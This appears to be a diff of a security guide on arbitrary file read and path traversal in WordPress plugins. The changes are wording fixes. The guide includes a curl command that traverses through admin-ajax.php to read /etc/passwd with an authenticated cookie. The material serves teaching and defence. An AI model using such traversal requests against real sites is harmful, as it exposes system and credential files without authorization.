@@ -72,8 +72,7 @@ Below are some of the findings related to Arbitrary File Read:
 
 ## Path Traversal
 
-Path traversal is a vulnerability that allows attackers to access files outside the intended directory by traversing file paths. A path traversal can be utilized to exploit the arbitrary file read in case the file read is limited to a specific directory.
-
+Path traversal is a vulnerability that allows attackers to access files outside the intended directory by traversing file paths. Path traversal can be used to exploit the arbitrary file read when the file read is limited to a specific directory.
 
 ## Example Cases
 
@@ -90,8 +89,8 @@ public function get_file_of_a_directory(){
 }
 ```
 
-To exploit this, any authenticated user just needs to perform a POST request to the `/wp-admin/admin-ajax.php` endpoint. The value of the `$_GET['file']` should be traversed backwards using `/../../` to access the files in other directory.
+To exploit this, any authenticated user needs to perform a POST request to the `/wp-admin/admin-ajax.php` endpoint. The value of the `$_GET['file']` should be traversed backward using `/../../` to access the files in another directory.
 
 ```bash
-curl '<WORDPRESS_BASE_URL/wp-admin/admin-ajax.php?action=get_file_of_a_directory&url=/../../../../../../../etc/passwd' -H 'Cookie: <AUTHENTICATED_USER_COOKIE>'
+curl '<WORDPRESS_BASE_URL>/wp-admin/admin-ajax.php?action=get_file_of_a_directory&url=/../../../../../../../etc/passwd' -H 'Cookie: <AUTHENTICATED_USER_COOKIE>'
 ```
